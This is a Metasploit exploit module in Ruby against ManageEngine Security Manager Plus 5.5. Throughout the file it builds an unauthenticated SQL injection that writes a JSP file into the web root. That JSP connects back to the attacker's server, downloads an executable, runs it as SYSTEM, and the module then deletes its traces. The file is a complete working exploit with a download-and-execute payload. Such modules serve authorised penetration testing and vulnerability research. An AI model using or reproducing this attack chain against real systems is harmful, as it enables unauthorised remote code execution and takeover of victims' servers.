##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ManageEngine Security Manager Plus 5.5 build 5505 SQL Injection",
			'Description'    => %q{
					This module exploits a SQL injection found in ManageEngine Security Manager Plus
				advanced search page.  It will send a malicious SQL query to create a JSP file
				under the web root directory, and then let it download and execute our malicious
				executable under the context of SYSTEM.  Authentication is not required in order
				to exploit this vulnerability.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'xistence <xistence[at]0x90.nl>',  # Discovery & Metasploit module
					'sinn3r'  # Improved Metasploit module
				],
			'References'     =>
				[
					['EDB','22094'],
					['BID', '56138']
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows Universal', {}]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Oct 18 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('RPORT', [true, 'The target port', 6262])
			], self.class)
	end


	#
	# A very gentle check to see if Security Manager Plus exists or not
	#
	def check
		res = send_request_raw({'uri' => '/SecurityManager.cc'})

		if res and res.body =~ /\<title\>SecurityManager Plus\<\/title\>/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end


	#
	# Remove the JSP once we get a shell.
	# We cannot delete the executable because it will still be in use.
	#
	def on_new_session(cli)
		if cli.type != 'meterpreter'
			print_warning("Meterpreter not used. Please manually remove #{@jsp_name + '.jsp'}")
			return
		end

		cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")

		begin
			print_warning("#{rhost}:#{rport} - Deleting: #{@jsp_name + '.jsp'}")
			cli.fs.file.rm("../webapps/SecurityManager/#{@jsp_name + '.jsp'}")
			print_good("#{rhost}:#{rport} - #{@jsp_name + '.jsp'} deleted")
		rescue ::Exception => e
			print_error("Unable to delete #{@jsp_name + '.jsp'}: #{e.message}")
		end
	end


	#
	# Transfer the malicious executable to our victim
	#
	def on_client_connect(cli)
		print_status("#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@native_payload.length} bytes)")
		cli.put(@native_payload)
		service.close_client(cli)
	end


	#
	# Generate a download+exe JSP payload
	#
	def generate_jsp_payload
		my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address("50.50.50.50") : datastore['SRVHOST']
		my_port = datastore['SRVPORT']

		var_buf       = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_shellcode = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_outstream = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_socket    = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_bufreader = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_decoder   = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_temp      = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_path      = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_proc      = Rex::Text.rand_text_alpha(rand(8) + 3)

		jsp = %Q|
		<%@page import="java.io.*"%>
		<%@page import="java.net.*"%>
		<%@page import="sun.misc.BASE64Decoder"%>

		<%
		StringBuffer #{var_buf} = new StringBuffer();
		byte[] #{var_shellcode} = null;
		BufferedOutputStream #{var_outstream} = null;
		try {
			Socket #{var_socket} = new Socket("#{my_host}", #{my_port});
			BufferedReader #{var_bufreader} = new BufferedReader(new InputStreamReader(#{var_socket}.getInputStream()));
			while (#{var_buf}.length() < #{@native_payload.length}) {
				#{var_buf}.append( (char) #{var_bufreader}.read());
			}

			BASE64Decoder #{var_decoder} = new BASE64Decoder();
			#{var_shellcode} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

			File #{var_temp} = File.createTempFile("#{@native_payload_name}", ".exe");
			String #{var_path} = #{var_temp}.getAbsolutePath();

			#{var_outstream} = new BufferedOutputStream(new FileOutputStream(#{var_path}));
			#{var_outstream}.write(#{var_shellcode});
			#{var_outstream}.close();

			Process #{var_proc} = Runtime.getRuntime().exec(#{var_path});
		} catch (Exception e) {}
		%>
		|

		jsp = jsp.gsub(/\n/, '')
		jsp = jsp.gsub(/\t/, '')

		jsp.unpack("H*")[0]
	end


	#
	# Run the actual exploit
	#
	def inject_exec
		# This little lag is meant to ensure the TCP server runs first before the requests
		select(nil, nil, nil, 1)

		# Inject our JSP payload
		hex_jsp = generate_jsp_payload

		cookie  = 'STATE_COOKIE=&'
		cookie << 'SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&'
		cookie << 'MainTabs/ID/167/_PV/174/selectedView/Home&'
		cookie << 'Home/ID/166/PDCA/MainDAC/_PV/174&'
		cookie << 'HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&'
		cookie << 'HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&'
		cookie << 'HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&'
		cookie << '_REQS/_RVID/SecurityManager/_TIME/31337; '
		cookie << '2RequestsshowThreadedReq=showThreadedReqshow; '
		cookie << '2RequestshideThreadedReq=hideThreadedReqhide;'

		rnd_num = Rex::Text.rand_text_numeric(1)
		sqli  = "#{rnd_num})) union select 0x#{hex_jsp},"
		sqli << (2..28).map {|e| e} * ","
		sqli << " into outfile #{@outpath} FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"

		state_id = Rex::Text.rand_text_numeric(5)
		print_status("#{rhost}:#{rport} - Sending JSP payload")
		res = send_request_cgi({
			'method'    => 'POST',
			'uri'       => "/STATE_ID/#{state_id}/jsp/xmlhttp/persistence.jsp",
			'headers'   => {
				'Cookie' => cookie,
				'Accept-Encoding' => 'identity'
			},
			'vars_get'  => {
				'reqType'    =>'AdvanceSearch',
				'SUBREQUEST' =>'XMLHTTP'
			},
			'vars_post' => {
				'ANDOR'       => 'and',
				'condition_1' => 'OpenPorts@PORT',
				'operator_1'  => 'IN',
				'value_1'     => sqli,
				'COUNT'       => '1'
			}
		})

		print_status("#{rhost}:#{rport} - Sending /#{@jsp_name + '.jsp'}")
		send_request_raw({'uri' => "/#{@jsp_name + '.jsp'}"})

		handler
	end


	#
	# The server must start first, and then we send the malicious requests
	#
	def exploit
		# Avoid passing this as an argument for performance reasons
		# This is in base64 is make sure our file isn't mangled
		@native_payload		 = [generate_payload_exe].pack("m*")
		@native_payload_name = rand_text_alpha(rand(6)+3)
		@jsp_name            = rand_text_alpha(rand(6)+3)
		@outpath             = "\"../../webapps/SecurityManager/#{@jsp_name + '.jsp'}\""

		begin
			t = framework.threads.spawn("reqs", false) { inject_exec }
			print_status("Serving executable on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
			super
		ensure
			t.kill
		end
	end
end